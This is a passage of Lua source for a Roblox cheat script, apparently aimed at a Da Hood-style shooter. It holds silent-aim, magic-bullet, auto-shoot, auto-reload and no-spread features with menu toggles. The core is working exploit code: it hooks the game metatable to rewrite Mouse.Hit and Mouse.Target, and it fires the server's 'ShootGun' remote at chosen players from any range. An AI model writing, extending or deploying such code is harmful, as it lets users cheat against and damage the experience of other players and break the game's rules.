	if (not v and getgenv().SilentAim.PlayerRemovingConnection) then
		getgenv().SilentAim.PlayerRemovingConnection:Disconnect();
		getgenv().SilentAim.PlayerRemovingConnection = nil;
	elseif v then
		if not getgenv().SilentAim.PlayerRemovingConnection then
			getgenv().SilentAim.PlayerRemovingConnection = S.PS.PlayerRemoving:Connect(function(player)
				if (getgenv().SilentAim.currentTarget == player) then
					getgenv().SilentAim.currentTarget = nil;
					if (G.TargetHUD and G.TargetHUD.Enabled) then
						getgenv().updateTargetInfo(nil);
					end
				end
			end);
		end
	end
end});
SilentAimGroup:AddDropdown("SilentAimMode", {Text="Mode",Values={"Sticky","Nuker"},Default="Nuker",Callback=function(v)
	getgenv().SilentAim.Options.Mode = v;
end});
addToggleWithNotify(SilentAimGroup, "SilentAimAutoAir", {Text="AutoAir",Default=false,Callback=function(v)
	getgenv().SilentAim.Options.AutoAir = v;
	if (not v and getgenv().SilentAim.AutoAirConnections) then
		for _, conn in ipairs(getgenv().SilentAim.AutoAirConnections) do
			if conn then
				conn:Disconnect();
			end
		end
		getgenv().SilentAim.AutoAirConnections = {};
	end
	if (v and getgenv().SilentAim.Options.Enabled) then
		if getgenv().Loaded_SilentAim then
			task.delay(0.1, function()
				if (getgenv().SilentAim and getgenv().SilentAim.setupAutoAirConnections) then
					getgenv().SilentAim.setupAutoAirConnections();
				end
			end);
		end
	end
end,Tooltip=">_<"});
addToggleWithNotify(SilentAimGroup, "SilentAimMagicBullet", {Text="MagicBullet",Default=false,Callback=function(v)
	getgenv().SilentAim.Options.MagicBullet = v;
end,Tooltip=">_<"});
addToggleWithNotify(SilentAimGroup, "SilentAimViewTarget", {Text="View",Default=false,Callback=function(v)
	getgenv().SilentAim.Options.ViewTarget = v;
	if not v then
		if (LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")) then
			game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid");
		end
	end
end,Tooltip=">_<"});
local MagicBulletGroup = SilentAimGroup:AddDependencyBox();
MagicBulletGroup:AddSlider("MagicBulletRange", {Text="Range",Default=10000,Min=100,Max=10000,Rounding=0,Callback=function(v)
	getgenv().SilentAim.MagicBullet.Range = tonumber(v) or 10000;
end,Tooltip=">_<"});
MagicBulletGroup:AddToggle("MagicBulletIgnoreKO", {Text="IgnoreKO",Default=false,Callback=function(v)
	getgenv().SilentAim.MagicBullet.IgnoreKO = v;
end,Tooltip=">_<"});
MagicBulletGroup:AddToggle("MagicBulletIgnoreGrabbed", {Text="IgnoreGrabbed",Default=false,Callback=function(v)
	getgenv().SilentAim.MagicBullet.IgnoreGrabbed = v;
end,Tooltip=">_<"});
MagicBulletGroup:AddToggle("MagicBulletIgnoreForceField", {Text="ForceField",Default=true,Callback=function(v)
	getgenv().SilentAim.MagicBullet.IgnoreForceField = v;
end,Tooltip=">_<"});
MagicBulletGroup:SetupDependencies({{Toggles.SilentAimMagicBullet,true}});
SilentAimGroup:AddInput("SilentAimPredictionXZ", {Text="PredictionXZ",Default=tostring(getgenv().SilentAim.Silent.PredictionXZ),Numeric=true,Finished=true,Callback=function(val)
	local n = tonumber(val);
	if n then
		getgenv().SilentAim.Silent.PredictionXZ = n;
	end
end});
SilentAimGroup:AddInput("SilentAimPredictionY", {Text="PredictionY",Default=tostring(getgenv().SilentAim.Silent.PredictionY),Numeric=true,Finished=true,Callback=function(val)
	local n = tonumber(val);
	if n then
		getgenv().SilentAim.Silent.PredictionY = n;
	end
end});
SilentAimGroup:AddInput("SilentAimJumpOffset", {Text="JumpOffset",Default=tostring(getgenv().SilentAim.Silent.Offsets.Jump.Amount),Numeric=true,Finished=true,Callback=function(val)
	local n = tonumber(val);
	if n then
		getgenv().SilentAim.Silent.Offsets.Jump.Amount = n;
	end
end});
SilentAimGroup:AddInput("SilentAimFallOffset", {Text="FallOffset",Default=tostring(getgenv().SilentAim.Silent.Offsets.Fall.Amount),Numeric=true,Finished=true,Callback=function(val)
	local n = tonumber(val);
	if n then
		getgenv().SilentAim.Silent.Offsets.Fall.Amount = n;
	end
end});
SilentAimGroup:AddLabel("Sticky Key"):AddKeyPicker("SilentAimStickyKey", {Default="None",Text="StickyKey",NoUI=false,Callback=function()
	if (Toggles.SilentAimEnabled and Toggles.SilentAimEnabled.Value and getgenv().SilentAim and getgenv().SilentAim.Options and (getgenv().SilentAim.Options.Mode == "Sticky")) then
		if _G.stickyTarget then
			stickyTarget = nil;
			_G.stickyTarget = nil;
			Library:Notify(">_< Target released", 2);
			return;
		end
		local target = nil;
		pcall(function()
			if (type(_G.getClosestPlayer) == "function") then
				target = _G.getClosestPlayer();
			end
		end);
		if target then
			stickyTarget = target;
			_G.stickyTarget = target;
			Library:Notify(">_< Target locked: " .. target.Name, 2);
		else
			Library:Notify(">_< No target found", 2);
		end
	end
end});
SilentAimGroup:AddToggle("SilentAimWallCheck", {Text="WallCheck",Default=false,Callback=function(v)
	getgenv().SilentAim.Misc.Checks.WallCheck = v;
end});
SilentAimGroup:AddToggle("SilentAimKOCheck", {Text="KOCheck",Default=false,Callback=function(v)
	getgenv().SilentAim.Misc.Checks.KOCheck = v;
end});
SilentAimGroup:AddToggle("SilentAimGrabbedCheck", {Text="GrabbedCheck",Default=false,Callback=function(v)
	getgenv().SilentAim.Misc.Checks.GrabbedCheck = v;
end});
SilentAimGroup:AddToggle("SilentAimTargetDeathCheck", {Text="DeathCheck",Default=false,Callback=function(v)
	getgenv().SilentAim.Misc.Checks.TargetDeathCheck = v;
end});
SilentAimGroup:AddDropdown("SilentAimResolverType", {Text="ResolverType",Values={"Calculate Cframe","Velocity","Move direction"},Default=getgenv().SilentAim.Misc.Checks.Resolver.Type,Callback=function(v)
	getgenv().SilentAim.Misc.Checks.Resolver.Type = v;
end});
getgenv().utility = {getHeld=function()
	return LP.Character:FindFirstChildWhichIsA("Tool");
end,target=nil,ValidateClient=function(self, player)
	if (player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player ~= LP)) then
		return true;
	end
	return false;
end};
getgenv().flags = {["Auto Shoot"]=false,["Auto Reload"]=false,["Fix Auto Guns"]=false};
getgenv().connections = {["auto reload"]={}};
getgenv().createVirtualClick = function()
	if not getgenv().VirtualUser then
		getgenv().VirtualUser = game:GetService("VirtualUser");
	end
	getgenv().VirtualUser:CaptureController();
	getgenv().VirtualUser:ClickButton1(Vector2.new(900, 900));
end;
getgenv().virtualClickTimer = 0;
getgenv().autoReload = function()
	local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if not target then
		return;
	end
	getgenv().reloadTool = getgenv().utility:getHeld();
	if (getgenv().flags["Auto Reload"] and getgenv().reloadTool and getgenv().reloadTool:FindFirstChild("Ammo")) then
		if (getgenv().reloadTool.Ammo.Value == 0) then
			local mainEvent = game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent");
			if mainEvent then
				mainEvent:FireServer("Reload", getgenv().reloadTool);
			else
				pcall(function()
					for _, service in pairs({game:GetService("ReplicatedStorage"),game:GetService("Players").LocalPlayer,workspace}) do
						local event = service:FindFirstChild("MainEvent", true);
						if event then
							event:FireServer("Reload", getgenv().reloadTool);
							return;
						end
					end
					getgenv().reloadTool:Activate();
				end);
			end
		end
	end
end;
getgenv().setupAmmoConnection = function(tool)
	if (tool:IsA("Tool") and tool:FindFirstChild("Ammo")) then
		if not getgenv().connections["auto reload"][tool] then
			getgenv().connections["auto reload"][tool] = tool.Ammo:GetPropertyChangedSignal("Value"):Connect(getgenv().autoReload);
		end
	end
end;
getgenv().setupAllAmmoConnections = function()
	for _, tool in pairs(LP.Backpack:GetChildren()) do
		getgenv().setupAmmoConnection(tool);
	end
	if LP.Character then
		for _, tool in pairs(LP.Character:GetChildren()) do
			getgenv().setupAmmoConnection(tool);
		end
	end
end;
getgenv().AutoShootToggle = addToggleWithNotify(SilentAimGroup, "AutoShoot", {Text="AutoShoot",Default=false,Callback=function(v)
	getgenv().flags["Auto Shoot"] = v;
	if getgenv().AutoShootConnection then
		getgenv().AutoShootConnection:Disconnect();
		getgenv().AutoShootConnection = nil;
	end
	if getgenv().VirtualClickConnection then
		getgenv().VirtualClickConnection:Disconnect();
		getgenv().VirtualClickConnection = nil;
	end
	if (Toggles.FixAutoGuns and Toggles.FixAutoGuns.Instance and Toggles.FixAutoGuns.Instance.Parent) then
		Toggles.FixAutoGuns.Instance.Parent.Visible = v;
	end
	if v then
		getgenv().AutoShootConnection = S.RS.Heartbeat:Connect(function()
			local hasValidTarget = false;
			local silentAimTarget = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
			if not silentAimTarget then
				return;
			end
			if (getgenv().utility.target and getgenv().utility:ValidateClient(getgenv().utility.target)) then
				local targetChar = getgenv().utility.target.Character;
				if (targetChar and targetChar:FindFirstChild("BodyEffects")) then
					local ko = targetChar.BodyEffects:FindFirstChild("K.O");
					local dead = targetChar.BodyEffects:FindFirstChild("Dead");
					if ((not ko or (ko.Value == false)) and (not dead or (dead.Value == false))) then
						hasValidTarget = true;
					end
				else
					hasValidTarget = true;
				end
			end
			if (hasValidTarget and getgenv().flags["Auto Shoot"]) then
				getgenv().currentTool = getgenv().utility:getHeld();
				if getgenv().currentTool then
					getgenv().currentTool:Activate();
				end
			end
		end);
		if getgenv().flags["Fix Auto Guns"] then
			getgenv().VirtualClickConnection = S.RS.Heartbeat:Connect(function()
				getgenv().virtualClickTimer = getgenv().virtualClickTimer or 0;
				if ((tick() - getgenv().virtualClickTimer) >= 1) then
					getgenv().virtualClickTimer = tick();
					getgenv().createVirtualClick();
				end
			end);
		end
		getgenv().setupAllAmmoConnections();
		if LP.Character then
			getgenv().characterChildAddedConnection = LP.Character.ChildAdded:Connect(function(child)
				getgenv().setupAmmoConnection(child);
			end);
		end
		getgenv().characterAddedConnection = LP.CharacterAdded:Connect(function(character)
			for tool, connection in pairs(getgenv().connections["auto reload"]) do
				if connection then
					connection:Disconnect();
					getgenv().connections["auto reload"][tool] = nil;
				end
			end
			getgenv().newCharacterChildAddedConnection = character.ChildAdded:Connect(function(child)
				getgenv().setupAmmoConnection(child);
			end);
		end);
	end
	Library:Notify(">_< " .. ((v and "on") or "off"), 3);
end,Tooltip=">_<"});
getgenv().FixAutoGunsToggle = addToggleWithNotify(SilentAimGroup, "FixAutoGuns", {Text="Fix Auto Guns",Default=false,Callback=function(v)
	getgenv().flags["Fix Auto Guns"] = v;
	if getgenv().VirtualClickConnection then
		getgenv().VirtualClickConnection:Disconnect();
		getgenv().VirtualClickConnection = nil;
	end
	if (getgenv().flags["Auto Shoot"] and getgenv().flags["Fix Auto Guns"]) then
		getgenv().VirtualClickConnection = S.RS.Heartbeat:Connect(function()
			getgenv().virtualClickTimer = getgenv().virtualClickTimer or 0;
			if ((tick() - getgenv().virtualClickTimer) >= 1) then
				getgenv().virtualClickTimer = tick();
				getgenv().createVirtualClick();
			end
		end);
	end
end,Tooltip=">_<"});
if (Toggles.FixAutoGuns and Toggles.FixAutoGuns.Instance and Toggles.FixAutoGuns.Instance.Parent) then
	Toggles.FixAutoGuns.Instance.Parent.Visible = false;
end
addToggleWithNotify(SilentAimGroup, "AutoReload", {Text="AutoReload",Default=false,Callback=function(v)
	getgenv().flags["Auto Reload"] = v;
	if v then
		getgenv().setupAllAmmoConnections();
	else
		for tool, connection in pairs(getgenv().connections["auto reload"]) do
			if connection then
				connection:Disconnect();
				getgenv().connections["auto reload"][tool] = nil;
			end
		end
	end
	Library:Notify(">_< " .. ((v and "on") or "off"), 3);
end,Tooltip=">_<"});
addToggleWithNotify(SilentAimGroup, "NoSpread", {Text="NoSpread",Default=SpreadMod.BulletSpread.Enabled,Callback=function(v)
	SpreadMod.BulletSpread.Enabled = v;
	Library:Notify(">_< " .. ((v and "on") or "off"), 3);
end,Tooltip=">_<"});
SilentAimGroup:AddSlider("SpreadAmount", {Text="Spread%",Default=SpreadMod.BulletSpread.Amount,Min=0,Max=100,Rounding=0,Callback=function(v)
	SpreadMod.BulletSpread.Amount = v;
end,Tooltip=">_<"});
SilentAimGroup:AddDropdown("SilentAimPart", {Text="Hitpart",Values={"HumanoidRootPart","UpperTorso","LowerTorso","Head"},Default=getgenv().SilentAim.Silent.Part,Callback=function(v)
	getgenv().SilentAim.Silent.Part = v;
end});
if not getgenv().Loaded_SilentAim then
	getgenv().Loaded_SilentAim = true;
	local SilentAim = getgenv().SilentAim;
	local Players = S.PS;
	local Workspace = S.WS;
	local UserInputService = S.UIS;
	local LocalPlayer = Players.LocalPlayer;
	local Camera = Workspace.CurrentCamera;
	local Inf = math.huge;
	local NewVector2 = Vector2.new;
	local NewCFrame = CFrame.new;
	stickyTarget = nil;
	_G.stickyTarget = nil;
	_G.AutoReload = false;
	_G.AutoReloadConnection = nil;
	_G.AutoShoot = false;
	_G.AutoShootConnection = nil;
	local lastPositions, lastUpdateTimes = {}, {};
	if SilentAim.PlayerRemovingConnection then
		SilentAim.PlayerRemovingConnection:Disconnect();
	end
	SilentAim.PlayerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
		if (SilentAim.currentTarget == player) then
			SilentAim.currentTarget = nil;
			if (G.TargetHUD and G.TargetHUD.Enabled) then
				getgenv().updateTargetInfo(nil);
			end
		end
		local playerId = player.UserId;
		if lastPositions[playerId] then
			lastPositions[playerId] = nil;
		end
		if lastUpdateTimes[playerId] then
			lastUpdateTimes[playerId] = nil;
		end
	end);
	local ReplicatedStorage = game:GetService("ReplicatedStorage");
	local MainEvent = ReplicatedStorage:FindFirstChild("MainEvent");
	local function isPlayerAlive(player)
		return player.Character and player.Character:FindFirstChild("Humanoid") and (player.Character.Humanoid.Health > 0);
	end
	local function isPlayerGrabbed(player)
		if (not player or not player.Character) then
			return false;
		end
		return player.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil;
	end
	local function hasForceField(player)
		if (not player or not player.Character) then
			return false;
		end
		return player.Character:FindFirstChildOfClass("ForceField") ~= nil;
	end
	local function isPlayerKO(player)
		if (not player or not player.Character) then
			return false;
		end
		local bodyEffects = player.Character:FindFirstChild("BodyEffects");
		if bodyEffects then
			local KO = bodyEffects:FindFirstChild("K.O");
			if (KO and KO:IsA("BoolValue") and KO.Value) then
				return true;
			end
		end
		local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart");
		if (humanoidRootPart and humanoidRootPart.Anchored) then
			return true;
		end
		return false;
	end
	local function wallCheck(character)
		if not SilentAim.Misc.Checks.WallCheck then
			return true;
		end
		if (not character or not character:FindFirstChild("HumanoidRootPart")) then
			return false;
		end
		local targetPos = character.HumanoidRootPart.Position;
		local cameraPos = Camera.CFrame.Position;
		local distance = (targetPos - cameraPos).Magnitude;
		local hitPart = Workspace:FindPartOnRayWithIgnoreList(Ray.new(cameraPos, (targetPos - cameraPos).Unit * distance), {LocalPlayer.Character,character});
		return hitPart == nil;
	end
	getgenv().getClosestPlayer = function()
		getgenv().mousePos = UserInputService:GetMouseLocation();
		getgenv().shortestDistance = Inf;
		getgenv().closestPlayer = nil;
		getgenv().partName = SilentAim.Silent.Part;
		for _, player in ipairs(Players:GetPlayers()) do
			getgenv().isAliveCheck = not SilentAim.Misc.Checks.TargetDeathCheck or isPlayerAlive(player);
			if ((player ~= LocalPlayer) and getgenv().isAliveCheck and (not SilentAim.Misc.Checks.KOCheck or not isPlayerKO(player)) and (not SilentAim.Misc.Checks.GrabbedCheck or not isPlayerGrabbed(player)) and wallCheck(player.Character)) then
				getgenv().character = player.Character;
				getgenv().part = getgenv().character and getgenv().character:FindFirstChild(getgenv().partName);
				if getgenv().part then
					getgenv().screenPos, getgenv().onScreen = Camera:WorldToViewportPoint(getgenv().part.Position);
					getgenv().distance = (NewVector2(getgenv().screenPos.X, getgenv().screenPos.Y) - getgenv().mousePos).Magnitude;
					if ((getgenv().distance < getgenv().shortestDistance) and getgenv().onScreen) then
						getgenv().closestPlayer = player;
						getgenv().shortestDistance = getgenv().distance;
					end
				end
			end
		end
		getgenv().utility.target = getgenv().closestPlayer;
		return getgenv().closestPlayer;
	end;
	_G.getClosestPlayer = getgenv().getClosestPlayer;
	local function predictPosition(player)
		if (not player.Character or not player.Character:FindFirstChild(SilentAim.Silent.Part)) then
			return nil;
		end
		local aimPart = player.Character[SilentAim.Silent.Part];
		local aimPartPos = aimPart.Position;
		local playerId = player.UserId;
		if (not lastPositions[playerId] or not lastUpdateTimes[playerId]) then
			lastPositions[playerId] = aimPartPos;
			lastUpdateTimes[playerId] = tick();
			return aimPartPos;
		end
		local currentTime = tick();
		local deltaTime = currentTime - lastUpdateTimes[playerId];
		local predictedPos;
		local resolverType = SilentAim.Misc.Checks.Resolver.Type;
		if (resolverType == "Velocity") then
			local velocity = aimPart.Velocity;
			predictedPos = aimPartPos + Vector3.new(velocity.X * SilentAim.Silent.PredictionXZ, velocity.Y * SilentAim.Silent.PredictionY, velocity.Z * SilentAim.Silent.PredictionXZ);
		elseif (resolverType == "Move direction") then
			predictedPos = aimPartPos + (player.Character.Humanoid.MoveDirection * SilentAim.Silent.PredictionXZ * 10);
		elseif (resolverType == "Calculate Cframe") then
			local distance = (aimPartPos - lastPositions[playerId]).Magnitude;
			if (distance < 0.001) then
				predictedPos = aimPartPos;
			else
				local predictedDistance = (distance / deltaTime) * 0.1 * SilentAim.Silent.PredictionXZ * 10;
				predictedPos = aimPartPos + ((aimPartPos - lastPositions[playerId]).Unit * predictedDistance);
				local yChange = ((aimPartPos.Y - lastPositions[playerId].Y) / deltaTime) * 0.1 * SilentAim.Silent.PredictionY;
				predictedPos = predictedPos + Vector3.new(0, yChange, 0);
			end
		end
		lastPositions[playerId] = aimPartPos;
		lastUpdateTimes[playerId] = currentTime;
		return predictedPos;
	end
	local function calculateVelocity(player)
		if (not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart")) then
			return Vector3.new(0, 0, 0);
		end
		return player.Character.HumanoidRootPart.Velocity;
	end
	local function getGun(player)
		if (not player or not player.Character) then
			return;
		end
		local tool = player.Character:FindFirstChildOfClass("Tool");
		if not tool then
			return;
		end
		local info = {};
		for _, obj in pairs(tool:GetDescendants()) do
			if (obj and obj.Name) then
				local name = STR.lower(obj.Name);
				if (name:find("ammo") and not name:find("max") and (obj:IsA("IntValue") or obj:IsA("NumberValue"))) then
					info.ammo = obj;
					info.tool = tool;
					return info;
				end
			end
		end
	end
	local function autoAir(target)
		if (G.autoAirDebounce or not SilentAim.Options.AutoAir or not target or not target.Character) then
			return;
		end
		local targetRootPart = target.Character:FindFirstChild("HumanoidRootPart");
		if not targetRootPart then
			return;
		end
		local humanoid = target.Character:FindFirstChildOfClass("Humanoid");
		if not humanoid then
			return;
		end
		local success, isInAir = pcall(function()
			return (humanoid:GetState() == Enum.HumanoidStateType.Jumping) or (humanoid:GetState() == Enum.HumanoidStateType.Freefall);
		end);
		if not success then
			isInAir = false;
		end
		local targetVel = calculateVelocity(target);
		local isMovingUp = targetVel.Y > 15;
		if (isInAir or isMovingUp) then
			local character = LocalPlayer.Character;
			if not character then
				return;
			end
			local tool = character:FindFirstChildOfClass("Tool");
			if tool then
				G.autoAirDebounce = true;
				pcall(function()
					tool:Activate();
				end);
				task.delay(G.autoAirDebounceTime, function()
					G.autoAirDebounce = false;
				end);
			end
		end
	end
	local function setupAutoAirConnections()
		local targetStateConnection = nil;
		local function updateTargetConnection()
			if targetStateConnection then
				targetStateConnection:Disconnect();
				targetStateConnection = nil;
			end
			if (SilentAim.currentTarget and SilentAim.currentTarget.Character) then
				local humanoid = SilentAim.currentTarget.Character:FindFirstChildOfClass("Humanoid");
				if humanoid then
					targetStateConnection = humanoid.StateChanged:Connect(function(_, newState)
						if (SilentAim.Options.AutoAir and ((newState == Enum.HumanoidStateType.Jumping) or (newState == Enum.HumanoidStateType.Freefall))) then
							autoAir(SilentAim.currentTarget);
						end
					end);
					SilentAim.AutoAirConnections = SilentAim.AutoAirConnections or {};
					table.insert(SilentAim.AutoAirConnections, targetStateConnection);
				end
			end
		end
		if SilentAim.AutoAirConnections then
			for _, conn in ipairs(SilentAim.AutoAirConnections) do
				if conn then
					conn:Disconnect();
				end
			end
			SilentAim.AutoAirConnections = {};
		end
		local lastTargetUpdateTime = 0;
		local targetUpdateDebounce = 0.1;
		local targetChangeConnection = RND:Connect(function()
			if (SilentAim.Options.Enabled and SilentAim.Options.AutoAir) then
				local now = tick();
				if ((now - lastTargetUpdateTime) > targetUpdateDebounce) then
					lastTargetUpdateTime = now;
					updateTargetConnection();
				end
			end
		end);
		SilentAim.AutoAirConnections = SilentAim.AutoAirConnections or {};
		table.insert(SilentAim.AutoAirConnections, targetChangeConnection);
		local checkAutoAirConnection = HRT:Connect(function()
			if (SilentAim.Options.Enabled and SilentAim.Options.AutoAir and SilentAim.currentTarget) then
				local targetChar = SilentAim.currentTarget.Character;
				if targetChar then
					local humanoid = targetChar:FindFirstChildOfClass("Humanoid");
					if (humanoid and ((humanoid:GetState() == Enum.HumanoidStateType.Jumping) or (humanoid:GetState() == Enum.HumanoidStateType.Freefall))) then
						autoAir(SilentAim.currentTarget);
					end
				end
			end
		end);
		table.insert(SilentAim.AutoAirConnections, checkAutoAirConnection);
		updateTargetConnection();
	end
	SilentAim.setupAutoAirConnections = setupAutoAirConnections;
	RND:Connect(function()
		if not SilentAim.Options.Enabled then
			SilentAim.currentTarget = nil;
			return;
		end
		local currentTarget = nil;
		if (SilentAim.Options.Mode == "Sticky") then
			local currentStickyTarget = _G.stickyTarget or stickyTarget;
			local isAliveCheck = (currentStickyTarget ~= nil) and (not SilentAim.Misc.Checks.TargetDeathCheck or isPlayerAlive(currentStickyTarget));
			if (currentStickyTarget and isAliveCheck and (not SilentAim.Misc.Checks.KOCheck or not isPlayerKO(currentStickyTarget)) and (not SilentAim.Misc.Checks.GrabbedCheck or not isPlayerGrabbed(currentStickyTarget))) then
				currentTarget = currentStickyTarget;
			else
				stickyTarget = nil;
				_G.stickyTarget = nil;
			end
		else
			currentTarget = getClosestPlayer();
		end
		SilentAim.currentTarget = currentTarget;
		pcall(function()
			if (SilentAim.Options.ViewTarget and currentTarget and currentTarget.Character) then
				local targetHumanoid = currentTarget.Character:FindFirstChildOfClass("Humanoid");
				if targetHumanoid then
					game:GetService("Workspace").CurrentCamera.CameraSubject = targetHumanoid;
				end
			elseif LP.Character then
				local playerHumanoid = LP.Character:FindFirstChildOfClass("Humanoid");
				if playerHumanoid then
					game:GetService("Workspace").CurrentCamera.CameraSubject = playerHumanoid;
				end
			end
		end);
		if (SilentAim.Options.AutoAir and currentTarget and ((tick() % 0.2) < 0.02)) then
			autoAir(currentTarget);
		end
		if (SilentAim.Options.MagicBullet and currentTarget and MainEvent) then
			local now = tick();
			SilentAim.MagicBullet.LastShot = now;
			if (currentTarget and currentTarget.Character) then
				local isKO = isPlayerKO(currentTarget);
				local isGrabbed = isPlayerGrabbed(currentTarget);
				local hasFF = hasForceField(currentTarget);
				local koCheckPassed = (isKO and SilentAim.MagicBullet.IgnoreKO) or not isKO;
				local grabbedCheckPassed = (isGrabbed and SilentAim.MagicBullet.IgnoreGrabbed) or not isGrabbed;
				local ffCheckPassed = (SilentAim.MagicBullet.IgnoreForceField and not hasFF) or not SilentAim.MagicBullet.IgnoreForceField;
				if (koCheckPassed and grabbedCheckPassed and ffCheckPassed) then
					local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool");
					if (tool and tool:FindFirstChild("Handle")) then
						local targetHead = currentTarget.Character:FindFirstChild("Head");
						local targetHRP = currentTarget.Character:FindFirstChild("HumanoidRootPart");
						if (targetHead and targetHRP) then
							local distance = (LocalPlayer.Character.HumanoidRootPart.Position - targetHRP.Position).Magnitude;
							local range = tonumber(SilentAim.MagicBullet.Range) or 5000;
							if (distance <= range) then
								task.spawn(function()
									local mainEvent = game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent");
									if mainEvent then
										mainEvent:FireServer("ShootGun", tool:FindFirstChild("Handle"), tool:FindFirstChild("Handle").CFrame.Position, targetHRP.Position, targetHead, Vector3.new(0, 0, -1));
									end
								end);
							end
						end
					end
				end
			end
		end
		if (getgenv().TS and getgenv().TS.Config and getgenv().TS.Config.Enabled) then
			getgenv().TS.Runtime.LastAimbotTarget = currentTarget;
		end
	end);
	local mt = getrawmetatable(game);
	local oldIndex = mt.__index;
	setreadonly(mt, false);
	mt.__index = function(self, key)
		if (not checkcaller() and (self == LocalPlayer:GetMouse()) and SilentAim.Options.Enabled) then
			if ((key == "Hit") or (key == "Target")) then
				local targetPlayer = SilentAim.currentTarget;
				if (targetPlayer and targetPlayer.Character) then
					local targetPart = targetPlayer.Character:FindFirstChild(SilentAim.Silent.Part);
					if targetPart then
						local finalPos = (SilentAim.Misc.Checks.Resolver.Enabled and predictPosition(targetPlayer)) or (targetPart.Position + (targetPart.Velocity * SilentAim.Silent.PredictionXZ));
						if finalPos then
							local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid");
							if humanoid then
								if (humanoid:GetState() == Enum.HumanoidStateType.Jumping) then
									finalPos = finalPos + Vector3.new(0, SilentAim.Silent.Offsets.Jump.Amount, 0);
								elseif (humanoid:GetState() == Enum.HumanoidStateType.Freefall) then
									finalPos = finalPos + Vector3.new(0, SilentAim.Silent.Offsets.Fall.Amount, 0);
								end
							end
							return ((key == "Hit") and NewCFrame(finalPos)) or targetPart;
						end
					end
				end
			end
		end
		return oldIndex(self, key);
	end;
	setreadonly(mt, true);
	local function fixTool(character)
		if character then
			for _, item in ipairs(character:GetChildren()) do
				if item:IsA("Tool") then
					item.Parent = LocalPlayer:FindFirstChildOfClass("Backpack");
					break;
				end
			end
		end
	end
	fixTool(LocalPlayer.Character);
	LocalPlayer.CharacterAdded:Connect(fixTool);
	setupAutoAirConnections();
end
local CrosshairGroup = Tabs.Visuals:AddRightGroupbox(">_<");
local CrosshairConfig = {Enabled=false,Color=Color3.fromRGB(255, 255, 255),Length=100,Spacing=5,Thickness=2,Rotate=true,RotSpeed=350,Outline=false,OutlineColor=Color3.fromRGB(0, 0, 0),OutlineThickness=4,AttachToTarget=false,AttachPart="UpperTorso",StaticAngle=0};
local function destroyCrosshair()
	for _, line in ipairs(G.crosshairLines) do
		pcall(function()
			line:Remove();
		end);
	end
	for _, line in ipairs(G.crosshairOutlines) do
		pcall(function()
			line:Remove();
		end);
	end
	G.crosshairLines, G.crosshairOutlines = {}, {};
	if G.crosshairConn then
		G.crosshairConn:Disconnect();
		G.crosshairConn = nil;
	end
end
local function createCrosshair()
	destroyCrosshair();
	for i = 1, 4 do
		G.crosshairLines[i] = Drawing.new("Line");
		if CrosshairConfig.Outline then
			G.crosshairOutlines[i] = Drawing.new("Line");
		end
	end
	local cos, sin, rad = M.cos, M.sin, M.rad;
	local lastMousePos = Vector2.new(0, 0);
	local lastTargetPos = Vector2.new(0, 0);
	local lastUpdateTime = 0;
	local updateInterval = 1 / 60;
	G.crosshairConn = S.RS.RenderStepped:Connect(function(dt)
		if not CrosshairConfig.Enabled then
			for _, l in ipairs(G.crosshairLines) do
				l.Visible = false;
			end
			for _, l in ipairs(G.crosshairOutlines) do
				l.Visible = false;
			end
			return;
		end
		local now = tick();
		if ((now - lastUpdateTime) < updateInterval) then
			return;
		end
		lastUpdateTime = now;
		local mousePos;
		if (CrosshairConfig.AttachToTarget and getgenv().SilentAim and getgenv().SilentAim.currentTarget) then
			local target = getgenv().SilentAim.currentTarget;
			if (target and target.Character) then
				local part = target.Character:FindFirstChild(CrosshairConfig.AttachPart) or target.Character:FindFirstChild("HumanoidRootPart");
				if part then
					local screenPos, onScreen = S.WS.CurrentCamera:WorldToViewportPoint(part.Position);
					if onScreen then
						mousePos = V2.new(screenPos.X, screenPos.Y);
						if ((mousePos - lastTargetPos).Magnitude < 1) then
							mousePos = lastTargetPos;
						else
							lastTargetPos = mousePos;
						end
					end
				end
			end
		end
		if not mousePos then
			mousePos = S.UIS:GetMouseLocation();
			if ((mousePos - lastMousePos).Magnitude < 1) then
				mousePos = lastMousePos;
			else
				lastMousePos = mousePos;
			end
		end
		if CrosshairConfig.Rotate then
			G.crosshairAngle = G.crosshairAngle + (CrosshairConfig.RotSpeed * dt);
		else
			G.crosshairAngle = CrosshairConfig.StaticAngle;
		end
		local angle = rad(G.crosshairAngle);
		local cosA, sinA = cos(angle), sin(angle);
		local function rot(x, y)
			return V2.new((cosA * x) - (sinA * y), (sinA * x) + (cosA * y));
		end
		local points = {{V2.new(0, (-CrosshairConfig.Length / 2) - CrosshairConfig.Spacing),V2.new(0, -CrosshairConfig.Spacing)},{V2.new(0, CrosshairConfig.Spacing),V2.new(0, (CrosshairConfig.Length / 2) + CrosshairConfig.Spacing)},{V2.new((-CrosshairConfig.Length / 2) - CrosshairConfig.Spacing, 0),V2.new(-CrosshairConfig.Spacing, 0)},{V2.new(CrosshairConfig.Spacing, 0),V2.new((CrosshairConfig.Length / 2) + CrosshairConfig.Spacing, 0)}};
		for i = 1, 4 do
			local startPoint = rot(points[i][1].X, points[i][1].Y);
			local endPoint = rot(points[i][2].X, points[i][2].Y);
			if (CrosshairConfig.Outline and G.crosshairOutlines[i]) then
				local ol = G.crosshairOutlines[i];
				ol.Visible = true;
				ol.Thickness = CrosshairConfig.OutlineThickness;
				ol.Color = CrosshairConfig.OutlineColor;
				ol.From = mousePos + startPoint;
				ol.To = mousePos + endPoint;
				ol.ZIndex = 0;
			elseif G.crosshairOutlines[i] then
				G.crosshairOutlines[i].Visible = false;
			end
			local l = G.crosshairLines[i];
			l.Visible = true;
			l.Thickness = CrosshairConfig.Thickness;
			l.Color = CrosshairConfig.Color;
			l.From = mousePos + startPoint;
			l.To = mousePos + endPoint;
			l.ZIndex = 1;
		end
	end);
end
